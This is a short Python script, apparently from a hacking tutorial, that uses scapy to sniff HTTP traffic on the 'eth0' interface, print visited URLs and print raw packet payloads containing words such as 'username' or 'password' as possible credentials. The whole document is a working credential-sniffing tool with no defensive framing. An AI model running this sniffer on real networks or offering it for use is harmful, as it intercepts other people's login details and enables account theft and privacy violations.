#!/usr/bin/env python
# import scapy / DEPRECATED scapy http
import scapy.all as scapy
from scapy.layers import http

# Function to sniff the network with interface parameter
def sniff(interface):
    # Sniff scapy using interface, store and prn parameters
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

# Function to get the URL with packet parameter
def get_url(packet):
    # Return the packet host and path
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

# Function get Login info
def get_login_info(packet):
    # If packet layer is scapy raw
    if packet.haslayer(scapy.Raw):
        # load the scapy raw
        load = packet[scapy.Raw].load
        # Keywords are equal to the possible forms
        keywords = ["username", "user", "login", "password", "pass"]
        # for each keyword in keywords
        for keyword in keywords:
            # if keyword in load
            if keyword in load:
                # return load
                return load


# Function to process snifed packet with packet paremeter
def process_sniffed_packet(packet):
    # if the packer has a layer http request
    if packet.haslayer(http.HTTPRequest):
        # get the url
        url = get_url(packet)
        # print the url
        print("[+] HTTP Request" + url)
    # get login info with packet
    login_info = get_login_info(packet)
    # If login info was captured print in terminal
    if login_info:
        print("\n\n[+] Possible username/password > " + login_info + "\n\n")


sniff("eth0")
